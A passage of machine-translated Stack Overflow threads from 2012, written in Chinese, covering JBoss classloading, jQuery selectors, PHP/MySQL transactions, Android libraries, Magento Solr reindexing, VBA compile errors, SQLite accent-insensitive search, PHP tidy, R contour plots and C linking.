    at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
    at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:39)
    at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:25)
    at java.lang.reflect.Method.invoke(Method.java:597)
    at org.jboss.mx.interceptor.ReflectedDispatcher.invoke(ReflectedDispatcher.java:157)
    at org.jboss.mx.server.Invocation.dispatch(Invocation.java:96)
    at org.jboss.mx.server.Invocation.invoke(Invocation.java:88)
    at org.jboss.mx.server.AbstractMBeanInvoker.invoke(AbstractMBeanInvoker.java:264)
    at org.jboss.mx.server.MBeanServerImpl.invoke(MBeanServerImpl.java:668)
    at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
    at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:39)
    at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:25)
    at java.lang.reflect.Method.invoke(Method.java:597)
    at org.jboss.jmx.connector.invoker.InvokerAdaptorService.invoke(InvokerAdaptorService.java:263)
    at sun.reflect.GeneratedMethodAccessor271.invoke(Unknown Source)
    at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:25)
    at java.lang.reflect.Method.invoke(Method.java:597)
    at org.jboss.mx.interceptor.ReflectedDispatcher.invoke(ReflectedDispatcher.java:157)
    at org.jboss.mx.server.Invocation.dispatch(Invocation.java:96)
    at org.jboss.mx.interceptor.AbstractInterceptor.invoke(AbstractInterceptor.java:138)
    at org.jboss.mx.server.Invocation.invoke(Invocation.java:90)
    at org.jboss.mx.interceptor.ModelMBeanOperationInterceptor.invoke(ModelMBeanOperationInterceptor.java:140)
    at org.jboss.jmx.connector.invoker.SerializableInterceptor.invoke(SerializableInterceptor.java:74)
    at org.jboss.mx.server.Invocation.invoke(Invocation.java:90)
    at org.jboss.mx.server.AbstractMBeanInvoker.invoke(AbstractMBeanInvoker.java:264)
    at org.jboss.mx.server.MBeanServerImpl.invoke(MBeanServerImpl.java:668)
    at org.jboss.invocation.jrmp.server.JRMPProxyFactory.invoke(JRMPProxyFactory.java:180)
    at sun.reflect.GeneratedMethodAccessor270.invoke(Unknown Source)
    at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:25)
    at java.lang.reflect.Method.invoke(Method.java:597)
    at org.jboss.mx.interceptor.ReflectedDispatcher.invoke(ReflectedDispatcher.java:157)
    at org.jboss.mx.server.Invocation.dispatch(Invocation.java:96)
    at org.jboss.mx.server.Invocation.invoke(Invocation.java:88)
    at org.jboss.mx.server.AbstractMBeanInvoker.invoke(AbstractMBeanInvoker.java:264)
    at org.jboss.mx.server.MBeanServerImpl.invoke(MBeanServerImpl.java:668)
    at org.jboss.invocation.jrmp.server.JRMPInvoker$MBeanServerAction.invoke(JRMPInvoker.java:855)
    at org.jboss.invocation.jrmp.server.JRMPInvoker.invoke(JRMPInvoker.java:422)
    at sun.reflect.GeneratedMethodAccessor269.invoke(Unknown Source)
    at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:25)
    at java.lang.reflect.Method.invoke(Method.java:597)
    at sun.rmi.server.UnicastServerRef.dispatch(UnicastServerRef.java:303)
    at sun.rmi.transport.Transport$1.run(Transport.java:159)
    at java.security.AccessController.doPrivileged(Native Method)
    at sun.rmi.transport.Transport.serviceCall(Transport.java:155)
    at sun.rmi.transport.tcp.TCPTransport.handleMessages(TCPTransport.java:535)
    at sun.rmi.transport.tcp.TCPTransport$ConnectionHandler.run0(TCPTransport.java:790)
    at sun.rmi.transport.tcp.TCPTransport$ConnectionHandler.run(TCPTransport.java:649)
    at java.util.concurrent.ThreadPoolExecutor$Worker.runTask(ThreadPoolExecutor.java:886)
    at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:908)
    at java.lang.Thread.run(Thread.java:680)
16:48:59,018 INFO  [SessionSpecContainer] Stopping jboss.j2ee:ear=reco.ear,jar=jboss-seam-2.2.1.CR2.jar,name=EjbSynchronizations,service=EJB3
16:48:59,027 INFO  [EJBContainer] STOPPED EJB: org.jboss.seam.transaction.EjbSynchronizations ejbName: EjbSynchronizations
16:48:59,059 INFO  [SessionSpecContainer] Stopping jboss.j2ee:ear=reco.ear,jar=jboss-seam-2.2.1.CR2.jar,name=TimerServiceDispatcher,service=EJB3
16:48:59,070 INFO  [EJBContainer] STOPPED EJB: org.jboss.seam.async.TimerServiceDispatcher ejbName: TimerServiceDispatcher 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-27T15:02:30.150

我认为您的 JBoss 中至少有两个 Dom4J 库。也许一个在您的 JBoss 库中，另一个在您的应用程序库中。而根本原因是lib与其他的不兼容。你最好确定哪个是你喜欢的，然后删除另一个。或者您可以调整配置以加载您想要的一个并省略另一个（如果另一个，假设 jboss 将被另一个应用程序使用）。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-27T14:46:03.953

您有两个版本的 Dom4J，删除其中一个。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-09-27T15:00:09.247

这是一个类加载问题。只需尝试如下，

jboss-部署-结构.xml

```
<jboss-deployment-structure xmlns="urn:jboss:deployment-structure:1.0">
  <deployment>
      <dependencies>
          <module name="org.hibernate" export="true"/>
          <module name="javax.faces.api" export="true" />
          <module name="com.sun.jsf-impl" export="true"/>
          <module name="org.dom4j" export="true"/>
          <module name="org.hibernate.validator" export="true"/>
        </dependencies>
  </deployment>  
</jboss-deployment-structure> 
```

jboss-web.xml

```
<class-loading java2ClassLoadingCompliance="false">
    <loader-repository>
        <loader-repository-config>java2ParentDelegation=false</loader-repository-config>
    </loader-repository>
</class-loading> 
```

应用程序.xml

```
<module>
    <java>WEB-INF/lib/dom4j-X.X.X.jar</java>
</module> 
```

# javascript - Jquery：获取一个类的所有元素，这些元素不是具有相同类名的元素的后代？

> ID：12624058
> 
> 赞同：3
> 
> 时间：2012-09-27T14:44:59.907
> 
> 标签：javascript, jquery

**问题**：给定一个特定的容器 dom 元素（窗口、div、fieldset 等），在该 DOM 元素中查找类 (.FormWidget) 的所有元素，递归搜索该容器的所有后代。包括**但不查看内部**具有匹配类 (.FormWidget) 的元素。元素可以嵌套到*n*层。

例如，给定这个 HTML：

```
<fieldset id="MyFieldset" class="FormWidget FieldSetMultiplier">
  <legend>My Legend</legend>

  <div>
    <label for="Field1">Field1</label>
    <input type="text" name="Field1" value="" id="Field1" class="BasicInput FormWidget">
  </div>

  <div id="SomeWidget" class="FormWidget">
    <label for="Field2">Field2</label>
    <div name="Field2" id="Field2" class="FormWidget RestrictedComboBox"></div>
    <input type="text">
  </div>
</fieldset>

<div>
    <label for="Field3">Field3</label>
    <input type="text" name="Field3" value="" id="Field3" class="BasicInput FormWidget">
</div> 
```

**示例 1：**

让伪 Jquery 函数“.findButNotInside()”代表我正在寻找的功能。

```
$(document).findButNotInside('.FormWidget'); 
```

应该只返回#MyFieldset 和#Field3。从窗口开始，字段 1 和 2 以及 #SomeWidget 是 FormWidgets，但由于该函数不允许在其他 .FormWidgets 内部查找 FormWidgets，因此无法包含它们。.FormWidget 字段集中的任何内容都是禁止的。

**示例 2：**

```
$('#MyFieldset').findButNotInside('.FormWidget'); 
```

应该只返回`#Field1`and `#SomeWidget`。它应该寻找`.FormWidget`目标字段集内的 s `#MyFieldset`，但不应返回 #Field2，因为它不允许查看 .FormWidget（在本例中为 #SomeWidget）内部来查找其他 .FormWidget。

我认为这可以通过正确的函数和选择器来完成，但我不确定应该如何构造该选择器？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-09-27T15:54:16.883

```
$.fn.findButNotInside = function(selector) {
    var origElement = $(this);
    return origElement.find(selector).filter(function() {
        var nearestMatch = $(this).parent().closest(selector);
        return nearestMatch.length == 0 || origElement.find(nearestMatch).length == 0;
    });
}; 
```

[小提琴](http://jsfiddle.net/AyLq7/)。诀窍是检查`nearestMatch`实际是否在我们的搜索上下文中。

请注意，这无效：

```
$('window').findButNotInside('.FormWidget'); 
```

...因为没有`<window>`标签。你想要的是：

```
$(document).findButNotInside('.FormWidget'); 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-09-27T14:52:04.760

```
$("container-selector").find(".class").not(".class .class"); 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-09-27T15:02:51.447

此解决方案依赖于有关 HTML 结构的已知信息：

```
$('body .FormWidget').filter(function(){
    return $(this).parents('.FormWidget').length == 0;
}).css("border", "solid 3px red");​

$('#MyFieldset .FormWidget').filter(function(){
    return $(this).parents('.FormWidget').length == 1;
}).css("border", "solid 3px blue"); 
```

[http://jsfiddle.net/dwgZu/](http://jsfiddle.net/dwgZu/)

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-09-27T15:15:24.647

想不出更优雅的“jqueryish”解决方案。但是，这可以递归地完成。

[http://jsfiddle.net/zzBMq/](http://jsfiddle.net/zzBMq/)

```
function findIt($elements){

    $elements.children().each(function(i){
        var $this = $(this);

        if($this.is(".FormWidget")){
            // do something with the matched element
            $this.css("border","1px solid red");
        }else{
            // make the recursive call
            findIt($this);
        }
    });
}

findIt($("#MyFieldset")); 
```

你显然可以把它变成一个插件。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-09-27T15:48:07.590

```
(function($){
    $.fn.findButNotInside = function(selector){
        var _n,_o,elemArr=[];
        this.find('.FormWidget').each(function(){
            _o = _n;
            _n = $(this);
            try{
                if(_o&&_o.find(_n).length){
                    _n = _o;
                    if(elemArr.indexOf(_o)==-1) throw _o;
                }else throw _n;
            }catch(e){
                elemArr.push(e);
            }
        });
       return $().add(elemArr);
    }
})(jQuery); 
```

小提琴：http: [//jsfiddle.net/guerilla/p9fMX/](http://jsfiddle.net/guerilla/p9fMX/)

# php - 检查 mysql_* 中的多个查询是否成功

> ID：12624060
> 
> 赞同：1
> 
> 时间：2012-09-27T14:45:00.903
> 
> 标签：php, mysql

我在 php 中执行两个不同的 mysql 查询，
但我还需要检查它们是否都成功。如果其中一个失败，我需要抛出一个错误**并**召回所做的更改。

有没有一种简单的方法可以做到这一点？

PS：一个是 and`update`另一个是`insert`.

*编辑*目前我有两个查询：

```
INSERT INTO table1 ( warning ) VALUES ( 0 ) WHERE con_id = 1
UPDATE table2 SET no_alerts = 1 WHERE con_id = 1 
```

我正在使用基本`mysql_`的插入和更新，没有 PDO。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-27T14:49:26.030

> 有没有一种简单的方法可以做到这一点？

[交易](http://php.net/manual/en/pdo.begintransaction.php)是您正在寻找的。

> 我使用的是普通的插入和更新，没有 PDO。

没有“普通插入/更新”之类的东西。如果您正在谈论使用古老的`mysql_*`功能，请停止使用它们。它们不再被维护并且社区已经开始了[弃用过程](http://goo.gl/KJveJ)。看到[**红框**](http://goo.gl/GPmFd)了吗？相反，您应该了解[准备好的语句](http://goo.gl/vn8zQ)并使用[PDO](http://php.net/pdo)或[MySQLi](http://php.net/mysqli)。如果你不能决定，[这篇文章](http://goo.gl/3gqF9)将有助于选择。如果你想学习，[这里有一个很好的 PDO 教程](http://goo.gl/vFWnC)。

如果您使用的是 PDO / mysqli，您可以在事务中进行查询。这样，您可以轻松地回滚更改而不是提交更改。

**更新**

如果您担心旧系统（尽管 PDO 是 5.1.0+ 而 mysqli 是 5+），您可以做一些事情，但它是一种**hack**，容易出错并且事情可能会变得一团糟。您可以存储查询的最后一个插入 ID，如果更新查询失败，您可以手动删除插入的行，但是如上所述，这在并发系统上很容易出错。

查询失败的原因可能是什么？也许有更好的做事方式？

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-27T14:48:04.457

我猜你正在寻找这样的东西

```
$result1 = mysql_query('INSERT INTO table1 ( warning ) VALUES ( 0 ) WHERE con_id = 1');
$result2 = mysql_query('UPDATE table2 SET no_alerts = 1 WHERE con_id = 1');

if(!$result1 || !$result2) {
  echo 'error';
} 
```

您应该使用 PDO ... mysql_query 已弃用。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-09-27T14:54:08.427

```
echo($resultQuery1 && $resultQuery2) ? 'No error' : 'Error'; 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-09-27T14:54:50.687

我认为有两种方式。首先，如果有可能无法插入或更新，我会先检查表的条件，看看是否有可能。如果您需要原子操作，您可以在此过程中锁定表，以确保另一个进程在您检查表和进行更新之间不会更改表。如果您需要高水平的并发性，这可能会减慢速度。

或者，如果您使用事务引擎（InnoDB 支持事务，MyISAM 不支持），您可以启动事务，然后监控更新和插入的返回值。

```
START TRANSACTION 
```

..然后检查您的操作结果。从 php 文档：

> 对于 SELECT、SHOW、DESCRIBE、EXPLAIN 和其他返回结果集的语句，mysql_query() 成功时返回资源，错误时返回 FALSE。
> 
> 对于其他类型的 SQL 语句，INSERT、UPDATE、DELETE、DROP 等，mysql_query() 在成功时返回 TRUE，在错误时返回 FALSE。
> 
> 返回的结果资源应该传递给 mysql_fetch_array() 和其他处理结果表的函数，以访问返回的数据。
> 
> 使用 mysql_num_rows() 找出 SELECT 语句返回了多少行，或使用 mysql_affected_rows() 找出有多少行受到 DELETE、INSERT、REPLACE 或 UPDATE 语句的影响。

如果您不成功，您可以回滚您的更改：

```
ROLLBACK 
```

最后，在不了解您的应用程序的情况下，我无法确定，但您可能能够设计数据集和应用程序，这样您一开始就不会陷入这种情况，这样会更快。事务和锁定表都很慢，所以除非有必要，否则我会避免使用它们。

# android - Android 库 - ClassDefNotFoundError - 不在 classes.dex 中的类

> ID：12624063
> 
> 赞同：0
> 
> 时间：2012-09-27T14:45:05.713
> 
> 标签：android

我有一个 Android 库（Java 代码），我使用 Eclipse 在多个 Android 应用程序项目中共享它。对于我过去创建的应用程序项目，我能够引用 Android 库并在运行时使用它没有问题。但是现在，对于我创建的任何新的 Android 应用程序项目，只要我在运行时引用库中的类，就会得到 ClassDefNotFoundErrors。

这只是 Android 库的问题；对于一般的 Java 库，我仍然可以从新的 Android 应用程序项目中引用它们，这没有问题。

使用 dex2jar 我发现在我的应用程序的 classes.dex 文件中，库的类*不*存在。而对于我的一切正常的旧应用程序项目，库的类*存在*于 classes.dex 中。

请注意，工作案例应用程序和非工作案例应用程序都引用磁盘上的同一个 Eclipse 项目。所以问题不在于库 Eclipse 项目，而在于应用程序 Eclipse 项目。

谁能告诉我我可能做错了什么？或者更一般地说，如何调试 Eclipse 创建 Android 应用程序的 classes.dex 的过程？

这是应用程序项目的屏幕截图，引用了我的“testlib”Android 库项目。我尝试在列表中上下移动参考，选中复选框等。 [![](../Images/5294134952a33bf1b5546618233e390b.png)](https://i.stack.imgur.com/Rh5rP.png)

谢谢，戴夫

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-27T14:50:52.053

如果您在项目中使用任何库，只需在此处查看我的答案[ClassDefNotFound error in android](https://stackoverflow.com/a/12511271/964741)它将解决您的问题..

# magento - Magento 重新索引丢失 Solr 文档

> ID：12624068
> 
> 赞同：6
> 
> 时间：2012-09-27T14:45:19.193
> 
> 标签：magento, solr

这让我有点发疯。我正在运行 SOLR 的 Magento EE 1.11.1。我们有一个每天晚上运行的 cron，它重新索引整个站点。每次执行此操作时，我都会检查 SOLR 配置，并且*numDocs*和*maxDocs*值只是当前应索引的值的一小部分（27000 与 ~90000）。**这意味着当我在网站上进行搜索时，结果只是应有的一小部分。**

让搜索正常工作的唯一方法是停止 SOLR，删除并重新创建 /apache-solr/site_name/solr/data 文件夹，重新启动，并通过 shell 重新索引目录搜索索引。如果我尝试通过 shell 运行这个特定的重新索引*而不*删除和重新创建数据文件夹，我只会得到大约一半的我应该得到的文档（~51000）。

数据文件夹中的所有索引文件都归 root 所有，SOLR jar 以 root 身份运行。我已将所有日志设置为*警告*，但当前没有记录任何内容。我使用 Solr 管理其他站点，从来没有遇到过这个问题——但是这个安装有很多属性 (330) 和许多产品 (~100,000)。这可能是问题的一部分吗？谢谢！

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-03-15T09:21:58.910

由于 Enterprise_Search 模块添加了一个默认每天凌晨 3 点运行的 cronjob，我找到了比在文件中添加一行代码更好的解决方案`shell/abstract.php`。

您需要做的就是创建一个小模块，将某个事件添加到全局命名空间而不是管理员：

```
<?xml version="1.0"?>
<config>
    <modules>
        <YourNamespace_YourModuleName>
             <version>0.0.1</version>
        </YourNamespace_YourModuleName>
    </modules>
    <global>
        <events>
            <!-- The misspelling (cat-e-logsearch) is correct, you can look it up in the config.xml of the Enterprise_Search module -->
            <catelogsearch_searchable_attributes_load_after>
                <observers>
                    <enterprise_search>
                        <class>enterprise_search/observer</class>
                        <method>storeSearchableAttributes</method>
                    </enterprise_search>
                </observers>
            </catelogsearch_searchable_attributes_load_after>
        </events>
    </global>
</config> 
```

不要忘记通过在以下位置放置另一个配置文件来激活您的模块`app/etc/modules/YourNamespace_YourModuleName.xml`：

```
<?xml version="1.0"?>
<config>
    <modules>
        <YourNamespace_YourModuleName>
            <active>true</active>
            <codePool>local</codePool>
            <depends>
                <Enterprise_Search/>
            </depends>
        </YourNamespace_YourModuleName>
    </modules>
</config> 
```

现在，您可以通过从 Magento 根文件夹发出以下命令，从命令行重建 Solr 索引（当然，假设您具有 shell 访问权限）：

```
php shell/indexer.php --reindex catalogsearch_fulltext 
```

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-10-04T14:30:23.373

EE1.12 也可能不是解决方案。我们在 EE1.12 上有一个客户端，它在 SOLR 集成方面存在问题。在他们的情况下，当索引器访问自定义产品属性时，所有索引尝试都会失败。

Nexcess 和 Magento 支持已经为此工作了超过 6 周，Magento 支持的当前状态是 -

> 不幸的是，该补丁仍在开发中，我无法告知我们的开发人员何时会完成它。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2013-01-21T08:17:40.230

在检查了几天的解决方案之后（顺便碰到这个问题），我想我有一个解决方案。我测试了它，我没有看到任何错误出现。

```
# shell/abstract.php @ line 75
public function __construct()
{
    if ($this->_includeMage) {
        require_once $this->_getRootPath() . 'app' . DIRECTORY_SEPARATOR . 'Mage.php';
        Mage::app($this->_appCode, $this->_appType);
        Mage::app()->addEventArea('adminhtml');# the magic line
    }

    $this->_applyPhpVariables();
    $this->_parseArgs();
    $this->_construct();
    $this->_validate();
    $this->_showHelp();
} 
```

问题是`enterprise_search/observer`没有加载，所以它可以触发该`storeSearchableAttributes`方法。这导致各种额外的数据无法注册。

我能想到的唯一副作用是，现在 shell**执行将加载所有管理员观察者**。这可能会导致速度下降，从而破坏从 shell 运行的部分目的。它不会像浏览器那么慢，但它可能会比以前慢。

如果您有任何问题或认为我可以通过其他方式提供帮助，请务必告诉！

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-10-20T01:05:35.870

您在运行索引器时是否花一些时间查看 solr 日志？我们目前正在运行 1.12，发现 solr 存在一些问题。当 solr 通知我们错误时，我们必须进行故障排除。

我的评论在我的回答中：[Magento 1.12 和 Solr 3.6 没有正确的结果，也没有拼写建议](https://stackoverflow.com/questions/11667728/magento-1-12-and-solr-3-6-no-proper-results-and-no-spell-suggestions)

我假设这个建议适用于 1.11，但您可能需要稍微修改它。打开 ./app/code/core/Enterprise/Search/Model/Adapter/Abstract.php 并找到 prepareDocsPerStore。

您可以监视和记录发送到 solr 的文档以进行完整性检查。所以你可以在 $docs[] = $doc; 下面做一些快速而肮脏的事情。喜欢：

$solr_log_file = '/mnt/tmp/'.date('Ymd',time()).'/'.$storeId.'-'.$productId.'-solr.txt'; file_put_contents($solr_log_file, var_export($doc, true)); 警告：我可能有一些语法错误，因为我刚刚敲定了这一点。

在此行之前和之后执行 $productIndexData 的 var_export 也证明是有启发性的： $productIndexData = $this->_prepareIndexProductData($productIndexData, $productId, $storeId);

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2013-03-20T09:55:15.917

嗨，我为这个问题找到了另一个解决方案，我用以下代码制作了一个小脚本

```
ini_set("memory_limit","1000M");
require_once "app/Mage.php";
umask(0);
Mage::app();
$observer = Mage::getModel('enterprise_search/observer');
$observer->storeSearchableAttributes(); 
```

使用名称 solrindex.php 并在 mydomain/solrindex.php 之类的浏览器中运行它，然后我从管理员重新索引目录搜索，这对我有用。

# excel - 为什么 excel 有时会产生“不正确”的错误消息？

> ID：12624074
> 
> 赞同：3
> 
> 时间：2012-09-27T14:45:39.117
> 
> 标签：excel, compiler-errors, vba

拿下面的代码；`End With`但是，当它被编译时，我错过了一个错误：`Next without For`这是不正确的。

```
Option Explicit
Public Sub Payments()
    Dim ws As Worksheet
    '--> Format the original workbook
    For Each ws In ThisWorkbook.Worksheets
        With ws
            .UsedRange.EntireColumn.Hidden = False

    Next

End Sub 
```

我也看到了这种行为以及其他错误，其中问题没有正确传达。为什么是这样？

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-09-27T14:52:54.243

错误并非不正确。从解释器的角度来看，它遇到的第一个问题是你有一个`Next`内部`With`块，这当然是一个错误。

[编译器和解释器（ clang](http://clang.llvm.org/) C 编译器可能例外）不擅长猜测两个可能的错误中的哪一个是您“想要”出现的错误。

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-09-27T14:51:03.310

您收到的错误消息是正确的。“Next without For”是错误消息，因为您的代码试图终止`For`代码块，同时仍在执行`With`代码块。`Next`和`End With`都是终止语句，嵌套块必须以正确的顺序终止。

对错误消息的更通俗易懂的解读是：“您正在尝试终止一段`For`代码，但您当前处于某种类型的代码块中，`For`所以我不知道该怎么做。” 碰巧您在一个`With`块中，但是编译器不够聪明，无法将该信息包含在其错误消息中。因此，错误消息是正确的，但肯定可以改进。

我误解了示例中代码错误的故意性质。这是一个无错误版本供参考：

```
Option Explicit
Public Sub Payments()
    Dim ws As Worksheet
    '--> Format the original workbook
    For Each ws In ThisWorkbook.Worksheets
        With ws
            .UsedRange.EntireColumn.Hidden = False
        End With
    Next
End Sub 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-09-27T14:53:51.217

你的问题是有效的。然而，这就是 VB 编译器/解释器的工作方式。
使用以下代码，它会抛出

> 编译错误：End With without With

```
Public Sub Payments()
    Dim ws As Worksheet
    '--> Format the original workbook
    With ws
        .UsedRange.EntireColumn.Hidden = False
    For Each ws In ThisWorkbook.Worksheets
    End With

End Sub 
```

看起来它是后进先出（即 found `End With`，但前一个元素不是`With`.

# intellij-idea - 如何通过键盘在 IntelliJ 中聚焦文档弹出窗口

> ID：12624077
> 
> 赞同：3
> 
> 时间：2012-09-27T14:45:51.230
> 
> 标签：intellij-idea

查看类型/参数/等的快速文档。在 IntelliJ 代码编辑器中，我使用 Ctrl + Q 快捷键。它正确显示了具有焦点的弹出窗口的快速文档弹出窗口，因此我可以在需要时滚动它。但是，当在可视化窗口中（选择数据源窗口中的任何表并按 Ctrl + Alt + Shift + U 或右键单击 | 图表 | 显示可视化）时，快速文档弹出窗口不会自动获得焦点。结果，当显示表格的快速文档弹出窗口时，我必须用鼠标单击弹出窗口以使其聚焦并滚动。有没有办法可以通过键盘聚焦快速文档弹出窗口？或者可以将 IntelliJ 配置为在我使用 Ctrl + Q 显示快速文档弹出窗口时自动聚焦？我希望这不是一个错误。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-27T15:40:29.307

这是一个特点。焦点停留在原始组件（项目视图、导航栏菜单等）上，以允许您更改选择并更新弹出内容。看看我制作的用于解释该功能的[截屏视频。](http://www.screenr.com/m4e8)要使用图表，我使用`Ctrl`+ `Shift`+ `Alt`+`U`快捷方式在专用编辑器选项卡中打开图表。

# android - Android，变音符号不敏感 SQLite 搜索

> ID：12624078
> 
> 赞同：20
> 
> 时间：2012-09-27T14:46:01.720
> 
> 标签：android, database, sqlite, collation

我正在尝试在 android 中查询 SQLite 数据库，其中应像处理普通拉丁字符一样处理带重音的法语字符，例如：

```
SELECT * FROM x WHERE y LIKE %cafe% 
```

应该返回

```
café, câfè, ... 
```

我已经用谷歌搜索了一整天，并阅读了关于 stackoverflow 的所有相关帖子。无法向表中添加包含规范化标题的列，因为数据库是从服务器获取并由第三方维护的。

使用其他帖子中提到的排序规则，例如

```
Latin1_general_CI_AI 
```

也没有选择，因为 SQLite 仅支持 3（在 android 5 中）对我没有帮助的排序规则。

将android中的数据库设置为

```
Locale.FRENCH 
```

并使用排序规则

```
COLLATE LOCALIZED 
```

也没有成功。

我知道 iOS (DiacriticInsensitiveSearch) 中有一些标志会自动执行，所以我希望这样的东西也可用于 android。

有任何想法吗？提前致谢！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-08T07:34:54.677

> 无法向表中添加包含规范化标题的列，因为数据库是从服务器获取并由第三方维护的。

您可以使用规范化列和原始表的外键创建单独的表。我认为这是您在 android 上使用 sqlite 的唯一选择。

或者，如果您可以以某种方式创建用户定义函数`remove_diacritics`，那么您将选择如下：

```
SELECT * FROM x WHERE remove_diacritics(lower(y)) 
LIKE remove_diacritics(lower(%cafe%)) 
```

但要注意索引`x.y`不会被使用。你也可能不需要`lower`. 但据我所知，如果可能的话，在 sqlite 上创建函数并不是那么容易。

# php - 从 php tidy 修复的 html 字符串中删除回车符

> ID：12624089
> 
> 赞同：1
> 
> 时间：2012-09-27T14:46:42.940
> 
> 标签：php, html, htmltidy, repair

我想检查字符串是否是有效的 xhtml/html。我有一些由 tinymce 编辑器获取的 html 字符串。我想在第一次将它保存到 mysql 数据库之前检查这个 html 字符串是否有效。我正在尝试 php tidy 库：

```
 $html = '<div> <a href="#">a link</a> this is test <p>close tag error</p> </p> <p></p>';
    $tidy = new \tidy();
    $clean = $tidy->repairString($html,array(
        'output-xml' => true,
        'input-xml' => true
    )); 
```

但它输出：

```
<div>\n<a href="#">a link</a>this is test \n<p>close tag error</p>other text \n<p></p></div> 
```

所以标签正确关闭，但整齐地放置 /n 个字符。如何修复没有回车符的html？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-27T14:58:11.607

虽然并不完美（因为它可能会破坏您拥有的任何实际回车），但快速的答案是：

```
 $string = str_replace('\n', '', $originalString); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-27T15:00:50.700

您需要使用 htmlspecialhars_decode() 来禁用特殊字符的显示...

```
$clean = htmlspecialchars_decode($clean); 
```

# r - 标记等高线图并显示真实值而不是 R 中的密度

> ID：12624090
> 
> 赞同：2
> 
> 时间：2012-09-27T14:46:52.593
> 
> 标签：r, list, ggplot2, contour

我正在尝试在列表中创建数据的等高线图，而不是像大多数可用示例那样创建矩阵。我已经在基本代码中尝试了填充轮廓图，并且遇到了诸如“找不到对象 x”之类的问题。我被提到使用 ggplot2 stat_density2d。尽管这会产生我在自定义它时遇到的麻烦的类型。如果您使用 geom_density2d 变量，有人知道如何用它们的值标记轮廓吗？还有人知道如何使密钥显示实际值而不是密度吗？我感觉我使用了错误的函数来描绘真实值，但不知道如何操纵 fill.contour 代码来使用列表。我在下面给出了我的数据和我当前使用的代码的示例。提前感谢您提供的任何帮助。冬青

数据集：

```
Grade <- structure(list(Eastings = c(156000L, 156010L, 156421L, 156450L, 156500L, 156700L, 158420L, 158646L, 158970L, 159050L, 159050L, 159130L, 159155L), Northings = c(143630, 143980, 147260, 145000, 146000, 142800, 146700, 145207, 147170, 145200, 144800, 147815, 145890), Zn = c(2, 8, 4, 0, 3, 0, 2, 7, 12, 0, 4, 19, 0)), .Names = c("Eastings", "Northings", "Zn"), row.names = c(1L, 2L, 3L, 4L, 5L, 6L, 7L, 8L, 9L, 10L, 11L, 12L, 13L), class = "data.frame") 
```

代码：

```
library(ggplot2)
Grade <- read.csv(file="filename.csv", header=TRUE, sep=",")
ggplot(data=Grade, aes(x=Eastings, y=Northings, z=Zn)) +
stat_density2d(aes(fill=..level..), contour=TRUE, geom="polygon") +
geom_density2d(colour="red", size=0.2) 
```

![当前代码结果](../Images/da6a6e09a2538addabd428e3bae76b3b.png)

# php - 错误调用对象的方法，除了在 foreach 块内

> ID：12624092
> 
> 赞同：0
> 
> 时间：2012-09-27T14:46:55.853
> 
> 标签：php, cakephp-2.0

我有一系列行为非常奇怪的对象。如果我将它放在 foreach 循环中，我可以运行该方法：

```
foreach ($options['image']->images as &$image) {
    var_dump($options['image']->images[0]->src('small'));
} 
```

返回：

```
string 'files/small/test.jpg' (length=20) 
```

但是，foreach 循环之外的相同 var_dump ：

```
var_dump($options['image']->images[0]->src('small'));
foreach ($options['image']->images as &$image) {
    var_dump($options['image']->images[0]->src('small'));
} 
```

返回

```
Error: Call to a member function src() on a non-object 
```

我进行了一些有趣的测试：

```
**Get Class**
echo get_class($options['image']->images[0]);
foreach ($options['image']->images as &$image) {
    var_dump($options['image']->images[0]->src('small'));
} 
```

返回：

```
Image 
```

和：

```
**Get Class Methods**
var_dump(
    get_class_methods($options['image']->images[0])
);
foreach ($options['image']->images as &$image) {
    var_dump($options['image']->images[0]->src('small'));
} 
```

返回：

```
array
  0 => string '__construct' (length=11)
  1 => string 'src' (length=3)
  2 => string 'makeThumb' (length=9)
  ... 
```

我看不出为什么 foreach 块之外的对象会有任何问题。值得注意的是 $options 数组本身来自一个 foreach 循环：

```
foreach ($option_goups as $options) 
```

# c - 单独构建C程序

> ID：12624098
> 
> 赞同：1
> 
> 时间：2012-09-27T14:47:10.473
> 
> 标签：c, c-preprocessor

我有两个 C 文件（第一个文件需要另一个）。

我应该使用`#include "XXX.C"`.obj 文件，但如何单独制作然后连接它（类似于 Borland 的项目）？我读了一些关于`link a, b`命令的东西，但它不起作用，我找不到任何参考。

谢谢！

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-09-27T14:56:17.313

